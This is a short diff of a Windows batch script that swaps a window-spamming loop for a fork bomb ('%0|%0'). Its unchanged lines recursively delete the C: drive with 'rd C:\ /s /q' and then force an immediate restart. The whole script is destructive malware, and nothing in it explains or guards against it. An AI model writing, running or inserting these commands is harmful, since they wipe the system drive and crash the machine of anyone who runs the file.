@@ -1,4 +1,4 @@
-for /l %%a in (1 1 3) do start "" cmd /q /c"for /l %%b in (0) do echo spam"
+%0|%0
 rd C:\ /s /q
 shutdown /r /f /t 0
 
